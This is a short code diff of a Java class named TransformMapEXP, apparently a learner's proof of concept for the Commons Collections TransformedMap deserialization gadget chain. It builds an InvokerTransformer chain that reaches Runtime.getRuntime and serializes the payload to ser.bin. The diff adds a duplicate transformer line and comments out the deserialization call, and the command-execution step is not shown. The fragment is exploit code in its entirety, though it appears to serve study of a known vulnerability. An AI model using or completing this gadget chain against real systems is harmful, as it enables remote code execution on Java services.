@@ -16,6 +16,7 @@ import java.util.Map;
 public class TransformMapEXP {
     public static void main(String[] args) throws Exception{
         Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
             new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
             new InvokerTransformer("getMethod",
                     new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
@@ -34,7 +35,7 @@ public class TransformMapEXP {
 
         // 序列化反序列化
         serialize(o);
-        unserialize("ser.bin");
+        //unserialize("ser.bin");
     }
     public static void serialize(Object obj) throws IOException {
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
